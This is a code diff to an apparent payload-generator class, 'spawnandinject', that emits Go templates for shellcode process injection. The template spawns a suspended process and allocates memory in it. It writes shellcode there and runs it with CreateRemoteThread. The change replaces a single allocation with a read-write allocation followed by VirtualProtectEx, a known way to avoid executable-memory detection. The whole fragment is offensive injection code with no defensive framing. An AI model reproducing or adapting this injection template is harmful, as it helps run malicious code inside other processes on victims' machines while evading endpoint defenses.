@@ -31,9 +31,10 @@ class spawnandinject:
 	}}
     target := []byte("$target");
 	{CreateProcessA}(0, uintptr(unsafe.Pointer(&target[0])), 0, 0, 1, windows.CREATE_SUSPENDED, 0, 0, uintptr(unsafe.Pointer(startupInfo)), uintptr(unsafe.Pointer(procInfo)))
-	addr, _, _ := {VirtualAllocEx}(uintptr(procInfo.Process), 0, uintptr(len(shellcode)), windows.MEM_COMMIT|windows.MEM_RESERVE, windows.$memoryPermission)
+	addr, _, _ := {VirtualAllocEx}(uintptr(procInfo.Process), 0, uintptr(len(shellcode)), windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE)
     _, _, _ = {WriteProcessMemory}(uintptr(procInfo.Process), addr, uintptr(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)), 0)
-    
+    oldProtect := 0
+	_, _, _ = {VirtualProtectEx}(uintptr(procInfo.Process), addr, uintptr(len(shellcode)), windows.$memoryPermission, uintptr(unsafe.Pointer(&oldProtect)))
     thread, _, _ := {CreateRemoteThread}(uintptr(procInfo.Process), 0, 0, addr, 0, 0, 0)
     
 	{WaitForSingleObject}(thread, 500)
